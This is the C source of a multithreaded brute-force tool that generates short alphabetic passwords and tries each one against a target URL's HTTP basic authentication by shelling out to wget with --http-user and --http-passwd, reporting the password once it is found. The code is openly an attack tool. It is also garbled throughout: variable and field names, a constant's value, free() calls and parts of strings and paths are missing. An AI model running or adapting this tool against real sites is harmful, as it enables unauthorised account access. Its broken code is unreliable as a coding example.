


#define _REENTRANT
#include <sys/time.h>
#include <sys/types.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>
#include <unistd.h>
#include <errno.h>
#include <ctype.h>
#include <pthread.h>
#include <signal.h>


#define MAX_THREADS 1000
#define MAX_COMBO 
#define false 0
#define true 1


static char *alphabet="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
static char **combination=NULL;
static char host[128];


pthread_mutex_t counter_lock = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t thread_lock = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t start_hacking = PTHREAD_COND_INITIALIZER;
pthread_cond_t thread_ready = PTHREAD_COND_INITIALIZER;


static int attempt_count=0;
static int combo_entries=0;

static struct timeval ;
static struct timeval stop;
static int thread_ready_indicator=false;
static int thread_start_indicator=false;
static int thread_count=0;


typedef struct range
{
  int ;
  int ;
}range;


void *client(void *arg)
{
  
  int i=0, status=1;
  range *= (struct range*)arg;

  
  char local_buffer[128];

  pthread_mutex_lock(&thread_lock);
  thread_ready_indicator=true;

  
  pthread_cond_signal(&thread_ready);

  
  while(thread_start_indicator==false) pthread_cond_wait(&start_hacking, &thread_lock);
    fflush(stdout);
  pthread_mutex_unlock(&thread_lock);

  
  for(i=->; i<=-> && i<combo_entries; i++)
  {
    
    sprintf(local_buffer,
    "wget -q -C off -o //null -O //null --http-user=%s --http-passwd=%s %s",
    "", combination[i], host);

    
    status=system(local_buffer);
    

    
    if(status==0)
    {
      printf("\n\nusername: \npassword: %s\n\n", combination[i]);
      fflush(stdout);

      
      pthread_mutex_lock(&counter_lock);

        attempt_count++;
        gettimeofday(&stop, NULL);

        printf("About %d attempts were , which took %ld.%ld seconds  complete.\n",
        attempt_count, stop.tv_sec-.tv_sec, labs(stop.tv_usec-.tv_usec));
        fflush(stdout);

      pthread_mutex_unlock(&counter_lock);

      
      exit(EXIT_SUCCESS);
    }
    else
    {
      
      pthread_mutex_lock(&counter_lock);
        attempt_count++;
      pthread_mutex_unlock(&counter_lock);
    }
  }
  pthread_exit(NULL);
}


char *getNextCombination()
{
  
  static int i=0;
  static int j=0;
  static int k=0;

  static int mode=1;
  char *word;


  

  if(i>51)
  {
    mode++; i=0; j=0; k=0;
  }

  
  if(mode==1)
  {
    char *word = calloc(mode, 1);
    word[0]=alphabet[i++];
    word[1]='\0';
    return word;
  }

  
  if(mode==2)
  {
    if(j>51)
    {
      i++; j=0;
    }

    if(i>51)
    {
      mode++;
      i=0; j=0; j=0;
    }
    else
    {
      char *word = calloc(mode, 1);
      word[0]=alphabet[i];
      word[1]=alphabet[j++];
      word[2]='\0';
      return word;
    }
  }

  
  if(mode==3)
  {
    if(k>51)
    {
      j++; k=0;
    }

    if(j>51)
    {
      i++; j=0;
    }

    if(i>51)
    {
       mode++;
       i=0; j=0; j=0;
     }
     else
     {
       char *word = calloc(mode, 1);
       word[0]=alphabet[i];
       word[1]=alphabet[j];
       word[2]=alphabet[k++];
       word[3]='\0';
       return word;
     }
   }
   return NULL;
}


int main(int argc, char **argv)
{
  
  int wait_status=0, i=0, j=0, num_threads=0;
  int partition=0, prev_min=0, prev_max=0;
  int len=0;
  char *word; range *;
  pthread_t tid[MAX_THREADS];
  int non_alpha_detected=0;

  
  if(argc<3)
  {
    puts("Incorrect usage!");
    puts("./brute num_threads url");
    exit(EXIT_FAILURE);
  }

  
  strcpy(host, argv[2]);

  
  num_threads=atoi(argv[1]);

  
  combination = (char **)calloc(MAX_COMBO, sizeof(char *));

  printf("Process ID for the  thread is: %d\n", getpid());
  printf("Creating brute-force dictionary ... ");
  
  
  while( (word=getNextCombination())!= NULL && i<MAX_COMBO)
  {
    combination[i]=calloc(strlen(word)+1, sizeof(char));
    strcpy(combination[i++], word);
    combo_entries++;
  }
  puts("");
  j=0;

  
  partition=combo_entries/num_threads;

  
  if(partition==0)
  {
    puts("Reducing the number of threads  match the number of words.");
    num_threads=combo_entries;
    partition=1;
  }

  
  prev_min=0;
  prev_max=partition;
  i=0;

  memset(&, 0, sizeof(struct timeval));
  memset(&stop, 0, sizeof(struct timeval));

  
  while(i<num_threads && i<MAX_THREADS)
  {
    
    =malloc(sizeof(struct range));
    ->=prev_min;
    ->=prev_max;

    
    pthread_mutex_lock(&thread_lock);
      thread_ready_indicator=false;
    pthread_mutex_unlock(&thread_lock);

    
    if(pthread_create(&tid[i++], NULL, client, (void *))!=0) puts("Bad thread ...");

    
    pthread_mutex_lock(&thread_lock);
      while(thread_ready_indicator==false) pthread_cond_wait(&thread_ready, &thread_lock);
    pthread_mutex_unlock(&thread_lock);

    
    prev_min+=partition+1;

    
    if(i==num_threads)
    {
      prev_max=combo_entries;
    }
    else
    {
      prev_max+=partition+1;
    }
  }

  
  gettimeofday(&, NULL);

  
  pthread_mutex_lock(&thread_lock);
    thread_start_indicator=true;
  pthread_mutex_unlock(&thread_lock);

  
  pthread_cond_broadcast(&start_hacking);

  
  printf("Created %d threads  process %d passwords\n", num_threads, combo_entries);
  printf("Attacking host: %s\n", host);
  fflush(stdout);

  
  for(i=0; i<num_threads && i<MAX_THREADS; i++)  pthread_join(tid[i], NULL);

  gettimeofday(&stop, NULL);

  
  puts("Could not determine the password for this site.");
  printf("About %d attempts were , which took %ld.%ld seconds  complete.\n",
  attempt_count, stop.tv_sec-.tv_sec, labs(stop.tv_usec-.tv_usec));
  fflush(stdout);

  
  for(i=0; i<combo_entries; i++) (combination[i]);
  (*combination);

  return EXIT_SUCCESS;
}

